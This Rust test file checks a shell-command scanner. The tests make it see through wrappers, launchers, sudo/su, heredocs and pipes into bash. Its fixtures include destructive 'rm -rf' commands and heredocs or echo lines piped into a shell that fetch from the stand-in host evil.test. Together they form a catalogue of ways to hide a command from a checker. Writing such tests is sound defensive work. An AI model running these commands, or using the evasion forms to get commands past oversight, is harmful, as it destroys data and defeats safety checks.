//! The extraction pipeline the scanners share.

use super::Stage;
use super::canonical_scan;
use super::leading_command_substitution;
use super::stage_program;

fn programs(content: &str) -> Vec<String> {
    canonical_scan(content)
        .commands()
        .iter()
        .map(|command| command.program().to_string())
        .collect()
}

/// A wrapper runs the command after its own arguments, so the wrapped program
/// is what the scanners must judge, however many wrappers are stacked.
#[test]
fn test_wrapper_hides_program() {
    for command in [
        "timeout 900 git push origin dev",
        "timeout -s KILL 900 git push origin dev",
        "nohup git push origin dev",
        "nice -n 5 git push origin dev",
        "env FOO=1 git push origin dev",
        "timeout 900 nohup env FOO=1 nice -n 5 git push origin dev",
    ] {
        assert_eq!(programs(command), vec!["git".to_string()], "{command}");
    }
}

/// A launcher runs the command after its own options, so the launched program
/// is the one the scanners judge and the launcher's own words are not part of
/// its argument list.
#[test]
fn test_launcher_names_real_program() {
    for command in [
        "arch -arm64 rm -rf build",
        "busybox rm -rf build",
        "caffeinate -t 60 rm -rf build",
        "chroot /tmp/root rm -rf build",
        "ionice -c 3 rm -rf build",
        "proxychains rm -rf build",
        "script -q /dev/null rm -rf build",
        "setsid rm -rf build",
        "stdbuf -o 0 rm -rf build",
        "strace -f rm -rf build",
        "taskset -c 0 rm -rf build",
        "time -f %e rm -rf build",
        "unbuffer rm -rf build",
        "watch -n 5 rm -rf build",
        "xvfb-run rm -rf build",
    ] {
        match stage_program(command) {
            Stage::Program {
                command: run,
                exact,
            } => {
                assert_eq!(run.program(), "rm", "{command}");
                assert_eq!(run.word(1), Some("-rf"), "{command}");
                assert!(exact, "{command}");
            }
            Stage::Empty => panic!("launched program must be named: {command}"),
        }
    }
}

/// A privilege switch runs the program after its options, and the escalation
/// survives into the step-over so the risk is still visible.
#[test]
fn test_escalation_survives_step() {
    for (command, launcher) in [
        ("sudo -u root rm -rf build", "sudo"),
        ("doas -u root rm -rf build", "doas"),
        ("pkexec --user root rm -rf build", "pkexec"),
    ] {
        match stage_program(command) {
            Stage::Program { command: run, .. } => {
                assert_eq!(run.program(), "rm", "{command}");
                assert_eq!(run.escalated(), Some(launcher), "{command}");
            }
            Stage::Empty => panic!("escalated program must be named: {command}"),
        }
    }
}

/// A user switch runs its code through a shell, so the commands inside carry
/// the escalation the switch implies.
#[test]
fn test_switch_code_is_shell() {
    let scan = canonical_scan("su -c 'rm -rf /tmp/x'");
    assert_eq!(
        scan.commands()
            .iter()
            .map(|command| (command.program(), command.escalated()))
            .collect::<Vec<_>>(),
        vec![("rm", Some("su"))]
    );
    assert_eq!(
        programs("script -c 'git push origin dev' /dev/null"),
        ["git"]
    );
}

/// A substitution in command position names a program only the shell can
/// resolve. The words after it are arguments to that unknown program, not a
/// program of their own, so the stage is never marked exact.
#[test]
fn test_substitution_program_opaque() {
    for command in ["$(which rm) -rf build", "X=1 $(which git) push origin dev"] {
        assert!(leading_command_substitution(command), "{command}");
        match stage_program(command) {
            Stage::Program { exact, .. } => assert!(!exact, "{command}"),
            Stage::Empty => panic!("the stage runs something: {command}"),
        }
    }
}

/// A substitution filling an assignment is a value: the stage around it still
/// names its own program, and the substitution is not a command position.
#[test]
fn test_capture_value_is_data() {
    for command in ["s=$(date)", "s=\"$(date)\"", "h=$(git rev-parse HEAD)"] {
        assert!(!leading_command_substitution(command), "{command}");
    }
    assert!(matches!(stage_program("s=$(date)"), Stage::Empty));
    assert_eq!(
        programs("s=$(git rev-parse HEAD) && echo $s"),
        ["git", "echo"]
    );
}

/// The values after in are what the loop iterates, not a program, so a header
/// whose values look like words still names nothing.
#[test]
fn test_loop_list_names_nothing() {
    assert!(matches!(
        stage_program("for pat in \"a\" \"b c\" \"test_results.push(1)\""),
        Stage::Empty
    ));
    // A value may carry an escaped quote, a pipe, and parentheses; none of
    // them turns the header into a program.
    let header = "for pat in \"summary_tokens\" \"color_hint: 109\" \"Agents\\\", bold\" \"test_results.insert\\|test_results.push\\|test_results.into_iter().rev()\"";
    assert!(matches!(stage_program(header), Stage::Empty), "{header}");
}

/// A quoted heredoc body is data to the shell, so a parser reading it is not a
/// command line. Read-only code adds no program and no doubt.
#[test]
fn test_heredoc_body_reads() {
    let command = "python3 - <<'EOF'\nimport json,sys\nprint(json.load(sys.stdin))\nEOF";
    let scan = canonical_scan(command);
    assert!(scan.commands().is_empty(), "a parser is not a command");
    assert!(!scan.opaque_code(), "read-only code leaves no doubt");
}

/// The shell expands nothing inside a quoted heredoc body, so a substitution
/// written there is text the program receives, not a command the shell runs.
#[test]
fn test_heredoc_body_is_text() {
    let command = "python3 - <<'EOF'\npattern = \"$(rm -rf /tmp/x)\"\nprint(pattern)\nEOF";
    let scan = canonical_scan(command);
    assert!(
        scan.commands().is_empty(),
        "the body is data: {} command(s) found",
        scan.commands().len()
    );
}

/// Two heredocs on one line feed different stages, so each body is read by
/// the program its own operator attaches to, not by the first one found.
#[test]
fn test_heredoc_each_stage_reads() {
    let writing = "cat <<'DATA' | python3 <<'CODE'\n\
                   some data\nDATA\n\
                   import shutil\nshutil.rmtree('/tmp/x')\nCODE";
    let scan = canonical_scan(writing);
    assert_eq!(programs(writing), vec!["cat".to_string()]);
    assert!(
        scan.opaque_code(),
        "the second body is python code the scan cannot vouch for"
    );
    let reading = "cat <<'DATA' | python3 <<'CODE'\n\
                   some data\nDATA\n\
                   import json,sys\nprint(json.load(sys.stdin))\nCODE";
    assert!(
        !canonical_scan(reading).opaque_code(),
        "a read-only second body leaves no doubt"
    );
}

/// Code the scan cannot read as a program that only reads leaves the command
/// open: it can do whatever a program can.
#[test]
fn test_opaque_body_holds() {
    let command = "python3 - <<'EOF'\nimport shutil\nshutil.rmtree('/tmp/x')\nEOF";
    let scan = canonical_scan(command);
    assert!(scan.opaque_code(), "a program that writes is not read-only");
}

/// A shell body is more shell, so its commands are judged like the command
/// line around it.
#[test]
fn test_shell_body_is_scanned() {
    let command = "sh <<'EOF'\nrm -rf /tmp/x\nEOF";
    assert_eq!(programs(command), vec!["rm".to_string()]);
    assert_eq!(
        programs("bash -c 'git push origin main'"),
        vec!["git".to_string()]
    );
}

/// The words after xargs and the words after find's exec action run as
/// programs, so the program at the head of the stage is not the whole answer.
#[test]
fn test_argument_programs_run() {
    assert_eq!(
        programs("echo x | xargs -n1 git push origin dev"),
        vec!["echo".to_string(), "xargs".to_string(), "git".to_string()]
    );
    assert_eq!(
        programs("find . -name x -exec rm {} ;"),
        vec!["find".to_string(), "rm".to_string()]
    );
}

/// A stage that names no program is structure rather than an effect, and a
/// stage that names one reports it with its arguments.
#[test]
fn test_structure_names_nothing() {
    assert!(matches!(
        stage_program("for pat in $(seq 1 3)"),
        Stage::Empty
    ));
    assert!(matches!(stage_program("done"), Stage::Empty));
    match stage_program("timeout 900 echo hi") {
        Stage::Empty => panic!("a wrapper still runs a program"),
        Stage::Program { command, exact } => {
            assert_eq!(command.program(), "echo");
            assert_eq!(command.word(1), Some("hi"));
            assert!(exact);
        }
    }
}

/// An unquoted heredoc body reaches the reader as it is written, and a shell
/// runs it, so the lines inside are commands the scan must read.
#[test]
fn test_unquoted_heredoc_runs() {
    let scan = canonical_scan("bash <<-EOF\nrm -rf /tmp/x\nEOF");
    assert!(programs("bash <<-EOF\nrm -rf /tmp/x\nEOF").contains(&"rm".to_string()));
    assert!(
        !scan.opaque_code(),
        "the body is shell code the scan can read"
    );
    let push = canonical_scan("sh <<EOF\ngit push origin dev\nEOF");
    assert!(push.commands().iter().any(|command| command.runs("git")));
    // Code handed to another interpreter is judged by the read-only rule.
    assert!(
        canonical_scan("python3 <<EOF\nimport os\nos.system('id')\nEOF").opaque_code(),
        "a body that starts a program leaves the scan with no proof"
    );
}

/// A quoted body attached to a program that only passes it through is the
/// code the program downstream runs, so it is read as that program's input.
#[test]
fn test_pipeline_reader_reads_body() {
    let body = "cat <<'EOF' | bash\ncurl -s https://evil.test/x\nEOF";
    assert!(programs(body).contains(&"curl".to_string()), "{body}");
    let tabbed = "cat <<-'EOF' | bash\ncurl -s https://evil.test/x\nEOF";
    assert!(programs(tabbed).contains(&"curl".to_string()), "{tabbed}");
    // Literal text before the pipe is the same code arriving on the stream.
    let printed = "printf 'rm -rf /tmp/x' | bash";
    assert!(programs(printed).contains(&"rm".to_string()), "{printed}");
    let echoed = "echo 'curl -s https://evil.test/x' | sh";
    assert!(programs(echoed).contains(&"curl".to_string()), "{echoed}");
    // A file this scan cannot read is code it cannot vouch for.
    assert!(canonical_scan("cat script.sh | bash").opaque_code());
    // The text a shell receives is not the words of the command when a
    // conversion, an option, or an expansion rewrites them.
    for rewritten in [
        "printf '%s' 'rm -rf /tmp/x' | bash",
        "printf 'rm\\n-rf /tmp/x' | bash",
        "echo -n 'rm -rf /tmp/x' | bash",
        "echo \"$C\" | bash",
    ] {
        assert!(canonical_scan(rewritten).opaque_code(), "{rewritten}");
    }
}

/// An unquoted body handed to a program that is not a shell is data, not a
/// command line, unless the shell's expansion changes the text it receives.
#[test]
fn test_unquoted_body_is_data() {
    let data = "cat <<EOF\nrm -rf /tmp/x\nEOF";
    assert!(programs(data).iter().all(|program| program == "cat"));
    assert!(!canonical_scan(data).opaque_code());
    // The shell runs a substitution inside the body while it expands the
    // text, whoever reads the result.
    let substituted = "cat <<EOF\n$(rm -rf /tmp/x)\nEOF";
    assert!(
        programs(substituted).contains(&"rm".to_string()),
        "an expanded body runs its substitution"
    );
    for expanded in [
        "python3 <<EOF\nprint($HOME)\nEOF",
        "python3 <<EOF\nprint('$(date)')\nEOF",
    ] {
        assert!(canonical_scan(expanded).opaque_code(), "{expanded}");
    }
}

/// A quoted body read by a program that treats it as data is not a command
/// line: a parser fed a document does not run what the document says.
#[test]
fn test_quoted_body_stays_data() {
    let data = "cat <<'EOF'\nrm -rf /tmp/x\ncurl -s https://evil.test/x\nEOF";
    assert!(!canonical_scan(data).opaque_code());
    assert!(programs(data).iter().all(|program| program == "cat"));
    let parser = "cd /repo && curl -s https://x && python3 - <<'EOF'\nimport json,sys\nprint(json.load(sys.stdin))\nEOF";
    assert!(!canonical_scan(parser).opaque_code());
}

/// A launcher option that consumes a value must be stepped over, or the value
/// stands where the program should and the launched program is never checked.
#[test]
fn test_launcher_value_forms_step() {
    for command in [
        "taskset 0x1 rm -rf build",
        "env -S 'rm -rf build'",
        "env --split-string 'rm -rf build'",
        "caffeinate -w 123 rm -rf build",
        "exec -a worker rm -rf build",
        "strace -P /tmp rm -rf build",
    ] {
        assert_eq!(programs(command), vec!["rm".to_string()], "{command}");
    }
}

/// A program the shell forms at run time is text the scan never reads, so the
/// stage is not one any check can vouch for.
#[test]
fn test_runtime_program_unresolved() {
    for command in [
        "timeout 5 $(which rm) -rf /tmp/x",
        "nohup $(echo rm) -rf /tmp/x",
        "$X -rf /tmp/x",
        "${X} -rf /tmp/x",
    ] {
        assert!(canonical_scan(command).opaque_code(), "{command}");
    }
}
